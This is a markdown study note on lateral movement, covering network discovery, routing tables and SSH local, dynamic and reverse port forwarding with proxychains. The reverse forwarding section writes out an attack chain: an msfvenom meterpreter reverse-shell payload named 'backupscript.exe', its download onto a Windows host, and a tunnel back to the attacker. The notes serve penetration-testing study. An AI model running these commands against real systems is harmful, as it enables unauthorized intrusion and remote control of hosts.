---
title: Lateral Movement Techniques
aliases: []
tags:
- topic/lateral-movement
- os/networking
- tools/ssh
- tools/nmap
- tools/msfconsole
- tools/xfreerdp
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: lateral-movement.md
related_tools:
- '[[ssh]]'
- '[[nmap]]'
- '[[msfconsole]]'
- '[[xfreerdp]]'
- '[[proxychains]]'
- '[[msfvenom]]'
related_techniques:
- '[[reverse port forward]]'
- '[[local port forward]]'
- '[[dynamic port forward]]'
related_tactics:
- '[[ta0003]]'
related_services:
- '[[ssh]]'
- '[[nmap]]'
- '[[msfconsole]]'
- '[[xfreerdp]]'
related_os:
- '[[ifconfig]]'
- '[[ipconfig]]'
- '[[netstat]]'
- '[[route]]'
related_notes: []
mitre_tactic: TA0003
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: windows, linux
---

# Lateral Movement Techniques

## Introduction
Lateral movement is a technique used by attackers to move between systems within a network. This is often done to gain deeper access and control over the network infrastructure.

## Identifying Network Devices
- Every device on the network has an IP address.
- Static IP addresses are usually assigned to critical services such as servers, routers, and printers.
- Linux `ifconfig` and Windows `ipconfig` can be used to view IP addresses, subnet masks, and default gateways.

## Routing
- Read routes in reverse; default is the last entry.
- Determine which networks you already have routes to and which networks are missing.
- Linux `netstat -r` and Windows `route print` can be used to view routing tables.

## Local Port Forwarding
- Example: MySQL hosted locally on `$ip`.
- Setup local port forward on port 1234 and send all traffic to `$ip` address.
- `ssh -L 1234:localhost:3306 victim@$ip`.
- Verify with `netstat -antp | grep 1234`.
- Connect with `mysql -h 127.0.0.1 -P 1234 -u username -p`.

## Dynamic Port Forwarding
- SOCKS (socket secure) proxy.
- Creates a proxy for all traffic between your device and the target.
- Can be local or another host.
- Example: `ssh -D 9050 ubuntu@$ip`.
- `proxychains nmap -v -sn 172.16.5.1-200`.
- `proxychains msfconsole` can also be used with Metasploit.
- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`.

## Reverse Port Forwarding
- We have access to a machine but cannot get tools to it directly.
- Find a machine that can access our attacker machine and the target machine.
- Build an exe which we copy to the middle machine and setup a Python server.
- The target machine then `iex` the exe and executes it, causing a `msfconsole` connection.
- Example: `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`.
- Run `msfconsole` and set the value for `LHOST` to `0.0.0.0`.
- Transfer payload to pivot host: `scp backupscript.exe ubuntu@<ipAddressofTarget>`.
- Start HTTP server on pivot host: `python3 -m http.server 8123`.
- On Windows host: `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`.
- SSH: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`.

